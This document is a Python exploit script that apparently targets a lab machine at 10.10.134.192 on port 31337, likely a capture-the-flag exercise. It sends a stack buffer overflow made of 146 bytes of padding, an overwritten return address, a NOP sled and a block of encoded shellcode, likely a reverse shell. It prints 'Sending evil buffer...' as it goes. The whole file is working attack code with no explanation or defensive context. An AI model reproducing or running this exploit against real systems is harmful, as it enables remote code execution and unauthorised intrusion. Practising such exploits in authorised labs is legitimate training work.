import socket

ip = "10.10.134.192"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
buf =  ""
buf += "\xba\xb8\x5b\xdd\x28\xdb\xdf\xd9\x74\x24\xf4\x5d"
buf += "\x31\xc9\xb1\x5e\x31\x55\x15\x83\xed\xfc\x03\x55"
buf += "\x11\xe2\x4d\xa7\x35\xa7\xad\x58\xc6\xd8\x9c\x8a"
buf += "\x4f\xfd\xba\xa1\x02\xce\xc9\xe4\xae\xa5\x9f\x1c"
buf += "\xa0\x0e\x55\x3b\x8f\x8f\xe2\x31\xc7\x5e\x34\x19"
buf += "\x2b\xc0\xc8\x60\x78\x22\xf1\xaa\x8d\x23\x36\x7d"
buf += "\xfb\xcc\xea\x29\x88\x41\x1a\x5d\xcc\x59\x1b\xb1"
buf += "\x5a\xe1\x63\xb4\x9d\x96\xdf\xb7\xcd\x07\x54\xef"
buf += "\xcd\xa6\xb9\x9b\x46\xb1\xb8\x55\x22\xfd\xf3\x9a"
buf += "\x82\x76\xc7\xef\x14\x5f\x16\x30\xd7\x90\x55\x1c"
buf += "\xd9\xe9\x5d\xbc\xaf\x01\x9e\x41\xa8\xd1\xdd\x9d"
buf += "\x3d\xc6\x45\x55\xe5\x22\x74\xba\x70\xa0\x7a\x77"
buf += "\xf6\xee\x9e\x86\xdb\x84\x9a\x03\xda\x4a\x2b\x57"
buf += "\xf9\x4e\x70\x03\x60\xd6\xdc\xe2\x9d\x08\xb8\x5b"
buf += "\x38\x42\x2a\x8d\x3c\xab\xb5\xb2\x60\x3c\x7a\x7f"
buf += "\x9b\xbc\x14\x08\xe8\x8e\xbb\xa2\x66\xa3\x34\x6d"
buf += "\x70\xb2\x52\x8e\xae\x7c\x32\x70\x4f\x7d\x1b\xb7"
buf += "\x1b\x2d\x33\x1e\x24\xa6\xc3\x9f\xf1\x53\xc9\x37"
buf += "\xf0\xb1\x96\xd0\x6c\xb4\x28\xce\x30\x31\xce\xa0"
buf += "\x98\x11\x5e\x01\x49\xd2\x0e\xe9\x83\xdd\x71\x09"
buf += "\xac\x37\x1a\xa0\x43\xee\x73\x5d\xfd\xab\x0f\xfc"
buf += "\x02\x66\x6a\x3e\x88\x83\x8b\xf1\x79\xe1\x9f\xe6"
buf += "\x1d\x09\x5f\xf7\x8b\x09\x35\xf3\x1d\x5d\xa1\xf9"
buf += "\x78\xa9\x6e\x01\xaf\xa9\x68\xfd\x2e\x98\x03\xc8"
buf += "\xa4\xa4\x7b\x35\x29\x25\x7b\x63\x23\x25\x13\xd3"
buf += "\x17\x76\x06\x1c\x82\xea\x9b\x89\x2d\x5b\x48\x19"
buf += "\x46\x61\xb7\x6d\xc9\x9a\x92\xed\x0e\x64\x61\xda"
buf += "\xb6\x0d\x99\x5a\x47\xce\xf3\x5a\x17\xa6\x08\x74"
buf += "\x98\x06\xf1\x5f\xf1\x0e\x78\x0e\xb3\xaf\x7d\x1b"
buf += "\x15\x6e\x7e\xa8\x8e\x81\x05\xc1\x31\x62\xfa\xcb"
buf += "\x55\x62\xfb\xf3\x6b\x5e\x2a\xca\x19\xa1\xef\x69"
buf += "\x01\x3c\xc5\x87\xaa\x99\x8c\x25\xb7\x19\x7b\x69"
buf += "\xce\x99\x89\x12\x35\x81\xf8\x17\x71\x05\x11\x6a"
buf += "\xea\xe0\x15\xd9\x0b\x21"
payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
byte_message = bytes(buffer, "latin-1")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(byte_message + b"\r\n")
    print("Done!")
except:
    print("Could not connect.")
